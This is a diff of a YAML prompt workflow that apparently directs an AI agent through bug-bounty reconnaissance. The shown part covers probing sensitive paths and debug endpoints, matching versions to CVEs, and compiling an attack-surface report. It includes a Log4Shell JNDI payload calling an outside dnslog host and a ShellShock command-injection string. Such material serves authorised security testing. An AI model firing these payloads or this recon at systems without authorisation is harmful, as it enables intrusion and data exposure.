+             - /sitemap.xml (hidden paths)
+             - /crossdomain.xml, /clientaccesspolicy.xml (Flash policy files)
+             - /security.txt, /.well-known/security.txt
+             - /.htaccess (Apache config)
+             - /server-status, /server-info (Apache mod_status/mod_info)
+
+          2. **Debug endpoints:**
+             - /debug, /trace, /actuator, /health, /metrics, /prometheus
+             - /heapdump, /threaddump, /info
+             - /api/health, /api/status, /api/version
+             - /console, /actuator/console, /h2-console (H2 DB console)
+             - /phpinfo.php, /info.php
+
+          3. **Error page analysis:**
+             - Trigger 404, 500, 403 errors on various endpoints
+             - Check error pages for: stack traces, internal IPs, SQL queries, file paths, DB credentials
+
+          4. **Directory listing:**
+             - Check if directory listing is enabled on upload directories
+             - Check /assets, /static, /uploads, /backup, /images
+
+          Output: all exposed sensitive files and information leaks.
+
+      - name: "cve-scanning"
+        depends_on: ["technology-fingerprinting"]
+        prompt: |
+          Target: ${TARGET}
+
+          Correlate detected technologies with known CVEs:
+
+          1. For each detected technology + version, search for:
+             - Known CVEs from the last 3 years
+             - Public exploit PoCs (Metasploit, ExploitDB, GitHub)
+             - Check if the version is end-of-life / unsupported
+
+          2. High-value targets:
+             - CMS versions (WordPress, Drupal, Joomla, Magento)
+             - Web server versions (Apache, Nginx, IIS, Tomcat)
+             - Framework versions (Django, Rails, Spring, Laravel, Express)
+             - Java versions (log4j — check for CVE-2021-44228)
+             - Proxy versions (Nginx, HAProxy, Envoy)
+
+          3. Quick checks:
+             - Log4Shell (CVE-2021-44228): `${jndi:ldap://test.dnslog.cn/a}`
+             - Spring4Shell (CVE-2022-22965): test class.module.classLoader
+             - ShellShock (CVE-2014-6271): `() { :;}; /bin/bash -c "id"`
+
+          Output: each version with relevant CVEs, exploit availability, and remediation.
+
+  # ══════════════════════════════════════════════════════════════════════════
+  # PHASE 7 — CONSOLIDATION & REPORT
+  # ══════════════════════════════════════════════════════════════════════════
+  - name: "recon-report"
+    tasks:
+
+      - name: "consolidate-findings"
+        depends_on:
+          - "passive-recon-base"
+          - "deep-github-recon"
+          - "google-dorking-advanced"
+          - "shodan-and-osint"
+          - "subdomain-enumeration"
+          - "port-and-service-scan"
+          - "technology-fingerprinting"
+          - "directory-fuzzing"
+          - "parameter-fuzzing"
+          - "vhost-fuzzing"
+          - "js-deep-analysis"
+          - "cloud-asset-enumeration"
+          - "web-crawl"
+          - "api-discovery"
+          - "subdomain-takeover"
+          - "cors-misconfiguration"
+          - "basic-injection-screening"
+          - "jwt-and-auth-screening"
+          - "graphql-screening"
+          - "information-disclosure"
+          - "cve-scanning"
+        prompt: |
+          Programme: ${PROGRAM}  |  Target: ${TARGET}
+
+          Consolidate ALL findings into a comprehensive attack surface report. This will be used by a penetration tester to prioritise exploitation.
+
+          ## Required Report Sections
+
+          ### 1. Executive Summary
+          - Programme name, target scope, recon date
+          - Total assets discovered (subdomains, IPs, endpoints, API endpoints, JS files, cloud assets)
+          - Top 3 most critical findings
+          - Overall attack surface rating (Small / Medium / Large)
+
+          ### 2. Subdomains & Hosts
+          Table: subdomain | IP | status code | tech | CNAME | takeover risk
+          Grouped by: production, staging, admin, API, CDN, mail, legacy
+
+          ### 3. Open Ports & Services
+          Table: host | port | service | version | severity | exploitation notes
+          Highlight: unexpected services, exposed databases, admin panels
+
+          ### 4. Technology Stack
+          - Web servers, frameworks, CMS, WAF/CDN
+          - Known CVEs per version (with CVE IDs)
+          - WAF bypass recommendations
+
+          ### 5. API Surface
+          - REST endpoints (table: endpoint | method | auth required | parameters)
+          - GraphQL schema (queries, mutations, introspection status)
+          - WebSocket endpoints
+          - OpenAPI/Swagger documentation URLs
+          - Exposed API keys / tokens
+
+          ### 6. Secret & Credential Leaks
+          - GitHub leaks (URL + what was leaked + severity)
+          - Pastebin / leak site findings
+          - JS secrets and hardcoded credentials
+          - Cloud storage exposures
+
+          ### 7. Interesting Endpoints
+          Prioritised list: admin panels, login pages, file uploads, debug endpoints, configuration files
+
+          ### 8. Cloud Assets
+          - S3 buckets, Azure blobs, GCP storage
+          - Access level (public/private)
+          - Takeover candidates (dangling CNAMEs)
+
+          ### 9. Low-Hanging Fruit Vulnerabilities
+          - Subdomain takeover candidates
+          - CORS misconfigurations
+          - Open redirects
+          - Basic injection leads (SQLi, SSTI, Command Injection)
+          - Information disclosure findings
+          - JWTs with weak algo / no signature verification
+
+          ### 10. Recommended Test Queue
+          Ordered by impact likelihood:
+          1. Critical/High: subdomain takeover, exposed admin panels, credential leaks, unauthenticated API access
+          2. Medium: CORS, missing auth headers, session weaknesses
+          3. Low: information disclosure, missing security headers
+
+          ### 11. Appendix: Methodology & Tools
+          - Recon methodology used (passive, active, fuzzing, etc.)
+          - Wordlists and wordlist paths used
+          - Commands run (for reproducibility)
+
+          Write in Markdown. Be precise and actionable. A pentester should be able to pick up this report and immediately know where to start testing.
